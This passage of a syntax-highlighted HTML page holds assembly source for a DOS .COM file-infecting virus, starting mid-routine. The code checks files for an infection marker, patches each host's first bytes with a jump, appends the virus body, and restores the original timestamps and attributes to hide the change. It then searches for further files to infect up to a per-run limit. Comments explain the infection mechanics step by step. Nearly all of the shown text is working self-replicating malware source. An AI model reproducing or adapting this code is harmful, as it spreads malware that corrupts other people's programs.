</span><span class="sc1">;check to see if it is infected. </span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">               </span><span class="sc1">;seek relative to start of file</span><span class="sc0">
        </span><span class="sc1">;       bx contains handle from open operation</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;cx:dx is file pointer</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;DOIT</span><span class="sc0">

</span><span class="sc1">;Now, we will read in enough data to see if we have our virus signature.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3fh</span><span class="sc0">                 </span><span class="sc1">;read data</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reference</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">original_code</span><span class="sc4">)]</span><span class="sc0">
                    </span><span class="sc1">;into original_code buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                   </span><span class="sc1">;5h bytes</span><span class="sc0">
    </span><span class="sc1">;       bx contains handle from last operation</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reference</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">original_code</span><span class="sc4">)+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0fafah</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">GoApe</span><span class="sc0">                   </span><span class="sc1">;if we aren't already infected,</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">Error</span><span class="sc0">                   </span><span class="sc1">;go for it</span><span class="sc0">

</span><span class="sc5">GoApe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Since it is safe to infect, we will</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">               </span><span class="sc1">;seek end of file</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                 
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">;check for valid .COM format</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Less_Than_64K</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">Error</span><span class="sc0">

</span><span class="sc5">Less_Than_64K</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;Now, we must calculate WHERE the jump will be to.  Let's examine the program</span><span class="sc0">
</span><span class="sc1">;Structure:</span><span class="sc0">
</span><span class="sc1">;jmp near ptr xxxx</span><span class="sc0">
</span><span class="sc1">;Cli Cli                       }These add up to the original length</span><span class="sc0">
</span><span class="sc1">;Orignal code sans 5 bytes</span><span class="sc0">

</span><span class="sc1">;Original_Code (5 bytes)       }The length of all virus data</span><span class="sc0">
</span><span class="sc1">;Other virus data               is equal to the difference in</span><span class="sc0">
</span><span class="sc1">;Infect                         the addresses of Infect and Original_Code</span><span class="sc0">

</span><span class="sc1">;End_Virus</span><span class="sc0">


</span><span class="sc1">;Thus, the jump must jump TO (offset Infect- offset Original_Code + Original_Length + origin)</span><span class="sc0">
</span><span class="sc1">;However, in the 80x86, NEAR jumps are calculated as an offset from the position</span><span class="sc0">
</span><span class="sc1">;of the next statement to execute (because of fetch/execute cycle operation).</span><span class="sc0">

</span><span class="sc1">;Since jmp near ptr xxxx takes 3 bytes, the next instruction is THREE bytes from</span><span class="sc0">
</span><span class="sc1">;The 0E9h jmp near instruction, so xxxx will be (offset Infect-Offset Original_Code</span><span class="sc0">
</span><span class="sc1">;+Original_Length-3);</span><span class="sc0">

        </span><span class="sc1">;Since AX already contains the original length, we will merely add</span><span class="sc0">
        </span><span class="sc1">;Space for the virus data, and take care of the three bytes</span><span class="sc0">
        </span><span class="sc1">;of code generated by the jmp near instruction.</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Original_Code</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">

                                        </span><span class="sc1">;calculate jump address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">   </span><span class="sc1">;jmp near instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;offset for near jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0fafah</span><span class="sc0"> </span><span class="sc1">;cli cli</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">               </span><span class="sc1">;seek begining of file</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">;write patched code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                   </span><span class="sc1">;5 bytes of code</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;our buffer</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">               </span><span class="sc1">;seek EOF</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">


    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Reference</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Original_Code</span><span class="sc4">)]</span><span class="sc1">; set start</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_Virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Original_Code</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;set length</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">;append virus to file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;doit</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">infected_Count</span><span class="sc0">  </span><span class="sc1">;bump up the number of programs infected</span><span class="sc0">

</span><span class="sc10">Error</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">date_stamp</span><span class="sc0">           </span><span class="sc1">;restore date</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">time_stamp</span><span class="sc0">           </span><span class="sc1">;restore time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">               </span><span class="sc1">;set them</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">                 </span><span class="sc1">;close file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Restore_Flags</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">                  </span><span class="sc1">;zero hi byte flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">attributes</span><span class="sc0">           </span><span class="sc1">;restore flags</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">file_name</span><span class="sc0">           </span><span class="sc1">;ds:dx points to ASCIIZ string</span><span class="sc0">
                                        </span><span class="sc1">;in the buffer, offset 1eh contains</span><span class="sc0">
                                        </span><span class="sc1">;the file name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">               </span><span class="sc1">;get/SET flags</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Doit</span><span class="sc0">

</span><span class="sc5">DoAgain</span><span class="sc4">:</span><span class="sc1">;See if we're done infecting</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">infected_count</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">infect_per_run</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">NoFile</span><span class="sc0">                  </span><span class="sc1">;if we're done, same as no new file</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">4fh</span><span class="sc0">                </span><span class="sc1">;find next</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">NoFile</span><span class="sc0">                  </span><span class="sc1">;if carry is clear, DOIT again!</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ReSearch</span><span class="sc0">

</span><span class="sc1">;Since we have no more files, we will restore things to normal.</span><span class="sc0">
</span><span class="sc5">NoFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">;reset default dta at DS:80h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ah</span><span class="sc0">                 </span><span class="sc1">;set DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">52</span><span class="sc0">                  </span><span class="sc1">;deallocate buffers and infected_count</span><span class="sc0">



</span><span class="sc1">;Put original code of program BEFORE it was infected back in place!</span><span class="sc0">


</span><span class="sc5">Done</span><span class="sc4">:</span><span class="sc0">   
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;restore ax</span><span class="sc0">


        </span><span class="sc1">;FUNKY code!  In the 80x86, all NEAR or SHORT jmp opcodes take</span><span class="sc0">
        </span><span class="sc1">;a RELATIVE address...... BUT a retn opcode pops a near absolute</span><span class="sc0">
        </span><span class="sc1">;address of the stack - saves us the trouble of some calculating</span><span class="sc0">
        </span><span class="sc1">;relative to here, and the trouble of a self-modifying</span><span class="sc0">
        </span><span class="sc1">;far absolute jmp! (5 bytes)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;easiest jump to cs:100</span><span class="sc0">

</span><span class="sc5">End_Virus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span></div></body>
</html>
